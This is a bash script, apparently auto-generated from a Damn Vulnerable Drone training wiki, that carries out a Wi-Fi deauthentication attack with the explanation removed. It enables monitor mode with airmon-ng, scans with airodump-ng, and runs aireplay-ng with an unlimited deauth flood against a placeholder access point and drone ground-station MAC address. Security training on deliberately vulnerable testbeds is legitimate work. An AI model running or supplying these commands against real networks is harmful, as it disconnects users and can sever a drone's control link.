#!/usr/bin/env bash
# Auto-generated from: /home/kali/MTD_full_testbed/Damn-Vulnerable-Drone.wiki/Wifi-Deauth-Attack.md
# Created: 2025-09-10 04:31:52
# NOTE: 설명/서사는 제거되었고, 코드블록/프롬프트 명령만 포함됩니다.
set -euo pipefail

# 기준 경로 (요구사항)
export BASE="${BASE:-$PWD}"

# 공통 로그 연결(선택사항) - 존재 시 로드
if [[ -f "$BASE/00_env.sh" ]]; then . "$BASE/00_env.sh"; else
  DVD_LOG="${DVD_LOG:-$BASE/attack_output/dvd.log}"; mkdir -p "$(dirname "$DVD_LOG")"
  log(){ echo "[`date +%F_%T`] $*"; }; export -f log
fi

log "[ATTACK] id=wifi-deauth-attack src=Wifi-Deauth-Attack.md"
log "[BLOCK 1] type=shell"
sudo airmon-ng start wlan0

log "[BLOCK 2] type=shell"
sudo airodump-ng wlan0mon

log "[BLOCK 3] type=shell"
sudo aireplay-ng --deauth 0 -a <AP_MAC> -c <GCS_MAC> wlan0mon

